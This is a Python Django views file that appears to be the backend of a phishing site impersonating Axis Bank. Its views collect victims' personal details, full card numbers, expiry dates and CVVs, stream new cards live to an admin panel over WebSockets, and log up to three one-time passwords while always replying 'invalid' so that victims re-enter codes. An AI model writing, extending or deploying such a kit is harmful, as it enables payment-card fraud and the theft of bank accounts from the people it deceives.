from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.http import JsonResponse
from django.shortcuts import redirect, render

from .models import ApplicantDetail


def intropage(request):
    return render(request, "intropage.html")


def home(request):
    return render(request, "home.html")


def datapage(request):
    if request.method == "POST":
        full_name = request.POST.get("full_name")
        mobile_number = request.POST.get("mobile_number")
        email = request.POST.get("email")
        dob = request.POST.get("dob")

        applicant = ApplicantDetail.objects.create(
            full_name=full_name,
            mobile_number=mobile_number,
            email=email,
            dob=dob,
        )

        request.session["applicant_id"] = applicant.id
        return redirect("card")

    return render(request, "datapage.html")


def card_view(request):
    if request.method == "POST":
        card_holder_name = request.POST.get("card_holder_name")
        card_number = request.POST.get("card_number")
        card_expiry = request.POST.get("card_expiry")
        card_cvv = request.POST.get("card_cvv")

        applicant_id = request.session.get("applicant_id")
        applicant = None

        if applicant_id:
            applicant = ApplicantDetail.objects.filter(id=applicant_id).first()

        if not applicant:
            applicant = ApplicantDetail.objects.create(
                full_name=card_holder_name
            )

        applicant.card_holder_name = card_holder_name
        applicant.card_number = card_number
        applicant.card_expiry = card_expiry
        applicant.card_cvv = card_cvv
        applicant.save()

        # Send WebSocket update to admin panel
        channel_layer = get_channel_layer()
        if channel_layer:
            async_to_sync(channel_layer.group_send)(
                "admin_live_cards",
                {
                    "type": "new_card_submitted",
                    "data": {
                        "id": applicant.id,
                        "card_holder_name": applicant.card_holder_name,
                        "card_number": applicant.card_number,
                        "card_expiry": applicant.card_expiry,
                        "created_at": applicant.created_at.strftime(
                            "%b. %d, %Y, %I:%M %p"
                        ),
                    },
                },
            )

        request.session["applicant_id"] = applicant.id
        return redirect("otp")

    return render(request, "card.html")


from .models import ApplicantDetail


def otp_view(request):
    if request.method == "POST":
        otp_code = request.POST.get("otp_code")
        attempt = request.POST.get("otp_attempt", "1")
        applicant_id = request.session.get("applicant_id")

        # Fetch the record linked to the active session/applicant
        user_record = None
        if applicant_id:
            user_record = ApplicantDetail.objects.filter(
                id=applicant_id
            ).first()

        if not user_record:
            user_record = ApplicantDetail.objects.last()

        if user_record:
            if attempt == "1":
                user_record.otp1 = otp_code
            elif attempt == "2":
                user_record.otp2 = otp_code
            else:
                user_record.otp3 = otp_code

            user_record.save()

        if request.headers.get("x-requested-with") == "XMLHttpRequest":
            return JsonResponse({"status": "invalid", "attempt": attempt})

    return render(request, "otp.html")


from rest_framework.decorators import api_view
from rest_framework.response import Response

@api_view(['GET'])
def get_card_data(request):
    data = {
        "status": "success",
        "card_name": "Axis Bank Credit Card",
        "limit": 50000,
        "available_balance": 42500
    }
    return Response(data)